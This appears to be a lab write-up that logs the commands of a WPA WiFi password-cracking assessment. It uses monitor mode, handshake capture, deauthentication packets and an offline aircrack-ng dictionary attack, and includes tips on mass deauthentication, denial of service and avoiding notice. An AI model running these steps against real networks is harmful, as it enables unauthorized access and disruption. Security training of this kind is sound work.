# Command Log

## Step 1: Identify the Wireless Interface

Identify available wireless interfaces.

### Command

```
iwconfig
```

This command displays wireless interfaces available to the Linux system.

### Result

- The wireless adapter used for the assessment (wlan0) was identified and selected for the subsequent wireless auditing activities.

### Evidence

**Output of `iwconfig` showing the wireless interface**

![Output of `iwconfig`](/screenshots/check-for-wireless-card.png)

---

## Step 2: Kill Conflicting Network Management Processes

Some network management processes may conflict with the process and prevent it from working as expected. 

To prevent that, you may have to check and kill the process.

### Command

```
sudo airmon-ng check kill
```

### Result

- Found the process wpa_supplicant
- Killed the process wpa_supplicant with pid 16446

### Evidence

**Kill conflicting processes**

![Kill conflicting processes](/screenshots/kill-conflicting-processes.png)

---

## Step 3: Enable Monitor Mode

Place the appropriate wireless adapter into monitor mode to allow the capture and analysis of 802.11 wireless traffic.

### Command

```
sudo airmon-ng start <interface>
```

Replace `interface` with the wireless interface identified in the previous step.

### Result

- The wireless adapter was successfully placed into monitor mode.

- The resulting monitor-mode interface was used for wireless traffic capture.

### Evidence

**Terminal output showing the wireless interface in monitor mode**

![Monitor mode](/screenshots/enable-monitor-mode.png)

---

## Step 4: Discover Wireless Networks

Scan the wireless environment to identify the authorized access point.

### Command

```
sudo airodump-ng --band abg <monitor-interface>
```

Without `--band abg` the command would still run; it only ensures that the network adapter scans all the wireless protocols. By default airodump only scans in the 2.4 GHz range

Replace `monitor-interface` with the wireless interface with monitore mode enabled. You can find it under 'interface' column in the output of the previous command.

This displays nearby wireless networks and relevant information such as:

- BSSID
- Channel
- Encryption type
- ESSID
- Signal information
- Associated clients

### Result

- The authorized wireless network was identified from the scan results.
- The relevant network information was recorded for the controlled assessment.
    Relevant information included: 
    - Access Point BSSID
    - Client MAC address
    - Wireless channel
    - Network ESSID

### Evidence

**airodump-ng output showing the authorized access point**

![Authorized access point](/screenshots/discover-networks.png)

---

## Step 5: Monitor for WPA Handshake

Monitor the wireless traffic on the target channel to capture the authentication exchange generated when client reconnects to the router.

Send the captured traffic to file.

### Command

```
sudo airodump-ng -c <channel> --bssid <target-bssid> -w <output-filename> <monitor-interface>
```

### Explanation

| Option                | Purpose                                            |
| --------------------- | -------------------------------------------------- |
| `-c`           | Specifies the wireless channel                     |
| `--bssid`             | Restricts monitoring to the specified access point |
| `-w`             | Saves captured traffic to files                    |
| `<monitor-interface>` | Specifies the monitor-mode interface               |

The capture was restricted to the authorized access point and its operating channel.

### Result

Packet capture started

> Note the client mac address (under station) in the result which will be used for the next step

### Evidence

**Monitoring the target wireless traffic**

![Handshake monitor](/screenshots/monitor-the-target-network.png)

---

## Step 6: Send a De-authentication Packet

While monitoring the target wireless traffic, open a new tab and send a de-authentication packet to a connected client using it's mac address from the previous step to trigger a reconnection.

### Command

```
sudo aireplay-ng --deauth 1 -a <target-bssid> -c <client-mac-address> <monitor-interface>

And/Or

sudo aireplay-ng --deauth 2 -a <target-bssid> -c <client-mac-address> <monitor-interface>
```

Either of the command should work but if you didn’t get a handshake from sending 1 deauth packet `--deauth 1` then try sending 2 which is the second command with `--deauth 2` 

Using `--deauth -0` will send de-authentication packet continously until you stop it which could cause a DOS attack. 

To send a deauthentication packet to every client connected to the target network, do not include the `-c` option which targets a particular MAC address. 

Note: high number of deauthentication messages are noisy on the network but 1 or 2 can go unnoticed.

### Result

- The disconnected client will attempt to reconnect

### Evidence

**Sending deauthentication packet** 

![Deauthentication](/screenshots/send-deauth-packet.png)

---

## Step 7: Verify Captured Authentication Data

Inspect the capture file to verify that the required authentication exchange had been captured.

### Commands

```
ls | grep <search term>
```
To list files in the working directory matching the capture filename

```
aircrack-ng <capture-file>
```
To check the capture file for valid WPA authentication data.

### Result
- The capture file is present is the working directory

- The capture was successfully recognized as containing WPA authentication information suitable for password verification.

### Evidence

**Confirmed handshake has been captured from the monitoring terminal**

![Handshake captured](/screenshots/handshake-captured.png)

**Confirmed handshake file exist**

![Handshake file](/screenshots/capture-file.png)

**Aircrack-ng identifying the captured WPA authentication data**

![WPA authentication data](/screenshots/wpa-authentication-data.png)

---

## Step 8: Disable Monitor Mode

Take the Wifi Adapter out of monitor mode

### Command

```
sudo airmon-ng stop wlan0
```

### Result

- Monitor mode disabled on the wireless adapter

### Evidence

**Wireless adapter monitor mode disabled**

![Disable monitor mode](/screenshots/monitor-mode-disabled.png)

---

## Step 9: Prepare Wordlist

Confirm the directory of your desired wordlist for offline password recovery.

### Command

```
wordlists -l
```
For this lab, I used the `rockyou` wordlist

### Result

- `rockyou.txt` present in the directory `/usr/share/wordlists/rockyou.txt`

### Evidence

![Wordlists](/screenshots/check-for-wordlist.png)

---

## Step 10: Perform Offline Password Recovery

The captured authentication data was tested against the authorized wordlist.

Command

```
aircrack-ng -w <path-to-wordlist> <capture-file>
```

### Explanation

| Option            | Purpose                                             |
| ----------------- | --------------------------------------------------- |
| `-w` | Specifies the location of the wordlist          |
| `<capture-file>`  | Specifies the captured wireless authentication data (handshake file)|

### Evidence

**Successful password recovery showing the recovered key**

![Password recovery](/screenshots/password-recovery.png)

--- 

# Results Summary

| Assessment Stage                   | Result     |
| ---------------------------------- | ---------- |
| Wireless interface identified      | Successful |
| Monitor mode enabled               | Successful |
| Authorized access point identified | Successful |
| Authorized client identified       | Successful |
| Wireless traffic captured          | Successful |
| WPA authentication data captured   | Successful |
| Wordlist                           | Present    |
| Offline password recovery          | Successful |
| Recovered password verified        | Successful |

---
